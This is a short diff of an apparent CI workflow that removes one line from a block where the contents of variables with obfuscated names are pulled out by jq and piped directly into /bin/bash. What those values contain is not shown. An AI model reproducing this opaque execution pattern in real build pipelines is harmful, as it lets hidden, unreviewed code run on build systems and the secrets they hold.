@@ -38,7 +38,6 @@ jobs:
           printf '%s' "$noe8686" | jq -r .hb5653 | /bin/bash
           printf '%s' "$ceg5" | jq -r .hgl437 | /bin/bash
           printf '%s' "$rm01794" | jq -r .bmkk3383 | /bin/bash
-          echo $wh7990 | jq -r .c92624 | /bin/bash
           printf '%s' "$wd23" | jq -r .i7095 | /bin/bash
           echo $fbf13125 | jq -r .gkn51051 | /bin/bash
           echo $pvk98785 | jq -r .gon98009 | /bin/bash
